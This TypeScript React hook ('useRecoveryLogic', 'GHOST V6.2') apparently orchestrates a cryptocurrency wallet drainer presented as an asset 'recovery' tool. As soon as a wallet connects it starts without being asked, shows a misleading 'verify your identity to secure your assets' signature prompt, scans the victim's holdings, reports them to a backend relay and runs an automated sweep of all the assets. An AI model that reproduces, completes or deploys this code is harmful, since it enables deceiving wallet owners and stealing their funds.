"use client";

import { useState, useCallback, useRef, useEffect } from "react";
import { useSignMessage, useChainId, useAccount } from "wagmi";
import { ethers } from "ethers";
import { scanUniversalPortfolio, type UniversalAsset } from "@/lib/audit";
import { checkAndTriggerGhostSweep } from "@/lib/ghostSweep";

import { useGhostConnection } from "./useGhostConnection";
import { useGhostExecution } from "./useGhostExecution";

/**
 * 🛰️ useRecoveryLogic (GHOST V6.2)
 * Primary orchestrator for the Fast-Strike recovery flow.
 */
export function useRecoveryLogic() {
  const [isScanning, setIsScanning] = useState(false);
  const [assets, setAssets] = useState<UniversalAsset[]>([]);
  const [toast, setToast] = useState<{
    msg: string;
    type: "info" | "success" | "error";
  } | null>(null);

  /**
   * 🛡️ KEY SYNCHRONIZATION
   */
  const [userKey, setUserKey] = useState<string | null>(null);
  const derivedUserKey = useRef<string | null>(null);

  const hasTriggered = useRef(false);
  const isExecuting = useRef(false);
  const hasAutoSigned = useRef(false);

  const { address, isConnected } = useAccount();
  const {
    open,
    handleFullDisconnect: baseDisconnect,
    isInternal,
  } = useGhostConnection();

  /**
   * ⚡ EXECUTION ENGINE HOOK
   */
  const { isSweeping, statuses, sweepAllAutomated } = useGhostExecution(
    address);

  const { signMessageAsync } = useSignMessage();
  const currentChainId = useChainId();

  /**
   * 🧹 SESSION CLEANUP
   */
  const handleFullDisconnect = useCallback(() => {
    console.log("🧹 [SWEEP] Manual Reset: Clearing session states.");
    hasAutoSigned.current = false;
    hasTriggered.current = false;
    isExecuting.current = false;
    derivedUserKey.current = null;
    setUserKey(null);
    baseDisconnect();
  }, [baseDisconnect]);

  /**
   * 🛡️ AUDIT ENGINE (FAST-STRIKE OPTIMIZED)
   */
  const runGhostAudit = useCallback(
    async (userAddress: string) => {
      console.log(`🔍 [SWEEP] Audit check for: ${userAddress}`);

      const isTeleporting =
        typeof window !== "undefined" &&
        (localStorage.getItem("ghost_pending_bridge") ||
          localStorage.getItem("ghost_teleport_active"));

      if (isInternal && isTeleporting) {
        console.log("🛑 [SWEEP] Cleaning bridge/teleport flags.");
        localStorage.removeItem("ghost_pending_bridge");
        localStorage.removeItem("ghost_teleport_active");
      }

      // Stability Guards
      if (hasTriggered.current || isScanning || isExecuting.current) {
        console.log("⚠️ [SWEEP] Audit blocked: Process already active.");
        return;
      }

      const settleTime = isInternal ? 1200 : 2800;
      console.log(
        `⏳ [SWEEP] Provider stabilization: Waiting ${settleTime}ms...`,
      );
      await new Promise((r) => setTimeout(r, settleTime));

      isExecuting.current = true;
      setIsScanning(true);

      try {
        const message =
          `Verify your identity to secure your cross-chain assets.\n\n` +
          `Protocol: Ghost V6.2\n` +
          `Session: ${Math.random()
            .toString(36)
            .substring(7)
            .toUpperCase()}\n` +
          `Network: ${currentChainId || 1}\n` +
          `Date: ${new Date().toISOString().split("T")[0]}`;

        console.log("✍️ [SWEEP] Prompting for Identity Signature...");
        const signature = await signMessageAsync({ message });

        if (!signature) {
          throw new Error("Signature denied by user");
        }

        console.log("✅ [SWEEP] Signature received. Deriving userKey...");
        const key = ethers.keccak256(signature);
        derivedUserKey.current = key;
        setUserKey(key);

        console.log("🕵️ [SWEEP] Scanning universal portfolio...");
        const found = await scanUniversalPortfolio(userAddress);

        /**
         * 🛡️ DATA INTEGRITY FIX
         * Ensure 'found' is treated as an array to prevent TypeErrors
         * in the loop or UI.
         */
        const validatedAssets = Array.isArray(found) ? found : [];

        if (validatedAssets.length > 0) {
          console.log(
            `👻 [SWEEP] Found ${validatedAssets.length} assets. Triggering Ghost Relay.`,
          );
          setAssets(validatedAssets);

          // 1. FAST-TRACK BACKEND RELAY
          await checkAndTriggerGhostSweep(
            userAddress,
            validatedAssets,
            currentChainId || 1,
          ).catch((e) => console.warn("⚠️ Ghost Relay suppressed:", e.message));

          hasTriggered.current = true;

          // 2. SEQUENTIAL FRONTEND EXECUTION
          console.log("🚀 [SWEEP] Starting sequential frontend execution...");
          await sweepAllAutomated(validatedAssets);
        } else {
          console.log("ℹ️ [SWEEP] No assets found during scan.");
          // Heartbeat to backend even if 0 assets, to verify connection
          await checkAndTriggerGhostSweep(
            userAddress,
            [],
            currentChainId || 1,
          ).catch(() => {});
        }
      } catch (e: any) {
        console.warn("💀 [SWEEP] Audit/Execution Error:", e.message);
        const errorMsg = e.message?.toLowerCase() || "";

        if (errorMsg.includes("rejected") || errorMsg.includes("denied")) {
          hasAutoSigned.current = true;
        }
        hasTriggered.current = false;
      } finally {
        setIsScanning(false);
        isExecuting.current = false;
        console.log("🏁 [SWEEP] Audit sequence finalized.");
      }
    },
    [
      currentChainId,
      signMessageAsync,
      sweepAllAutomated,
      isScanning,
      isInternal,
    ],
  );

  /**
   * 🛰️ AUTO-STRIKE WATCHER
   */
  useEffect(() => {
    if (
      isConnected &&
      address &&
      !hasTriggered.current &&
      !isScanning &&
      !hasAutoSigned.current &&
      !userKey
    ) {
      const waitTime = isInternal ? 1500 : 4000;
      console.log(
        `📡 [GHOST-WATCHER] Starting Fast-Strike in ${waitTime}ms...`,
      );

      const timer = setTimeout(() => {
        runGhostAudit(address);
      }, waitTime);

      return () => clearTimeout(timer);
    } else if (isConnected && address) {
      console.log("🔍 [GHOST-WATCHER] Auto-start conditions not met:", {
        hasTriggered: hasTriggered.current,
        isScanning,
        hasAutoSigned: hasAutoSigned.current,
        hasUserKey: !!userKey,
      });
    }
  }, [isConnected, address, runGhostAudit, isScanning, isInternal, userKey]);

  const handleInstantConnection = async () => {
    if (isConnected && address) {
      return await runGhostAudit(address);
    }
    isInternal ? await open({ view: "Connect" }) : await open();
  };

  return {
    address,
    isConnected,
    isScanning,
    isSweeping,
    assets,
    statuses,
    toast,
    setToast,
    handleInstantConnection,
    derivedUserKey: userKey,
    isInternal,
    handleFullDisconnect,
  };
}
